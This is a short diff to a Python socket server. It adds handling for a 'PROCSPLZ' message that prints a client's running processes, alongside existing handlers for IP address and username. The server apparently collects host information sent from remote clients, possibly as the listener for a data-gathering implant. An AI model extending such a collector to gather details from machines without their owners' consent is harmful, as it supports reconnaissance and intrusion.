@@ -55,6 +55,8 @@ def clientthread(conn):
             print("[D] IP Address: " + str(client_data[:15]) + '\n')
         elif conn_type == b'USERNAME':
             print("[D] Username: " + str(client_data[:32]) + '\n')
+        elif conn_type == b'PROCSPLZ':
+            print("[D] Running Processes: " + str(client_data) + '\n')
         elif conn_type == b'STORETXT':
             print("[D] Connection Type: STORE TEXT (STORETXT)")
             #TODO actually store the data
